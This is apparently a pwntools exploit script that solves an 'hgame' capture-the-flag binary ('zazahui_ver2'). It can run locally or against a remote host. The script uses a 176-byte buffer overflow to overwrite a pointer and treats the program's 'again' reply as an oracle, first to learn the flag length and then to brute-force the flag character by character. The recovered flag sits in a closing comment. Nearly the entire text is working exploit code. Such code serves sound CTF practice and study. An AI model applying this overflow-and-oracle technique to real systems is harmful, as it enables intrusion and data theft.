from pwn import *
import string

# context.log_level = 'debug'
local = 1

if local:
	p = process('./zazahui_ver2')
	bin = ELF('./zazahui_ver2')
else:
	p = remote('111.230.149.72' , 10010)


def z(a=''):
	gdb.attach(cn, a)
	if a == '':
		raw_input()
p.recvuntil(">")
flaglen = 0
flag = ''
for i in range(0x100):
	payload = ''
	payload = payload.ljust(176, '\x00')
	payload += p32(0x804a060 + i)
	p.send(payload)
	d = p.recvuntil('>')
	if 'again' in d:
		flaglen = i
		break
print 'flaglen: ', flaglen

#gdb.attach(p)

for i in range(flaglen):
	print 'i: ', i
	for c in string.printable:
		payload = c + flag
		payload = payload.ljust(176, '\x00')
		payload += p32(0x804a060 + flaglen - i -1)
		p.send(payload)
		d = p.recvuntil('>')
		if 'again' in d:
			flag = c + flag
			break
print flag
# hgame{bao_po_flag_is_intersting_LOL}
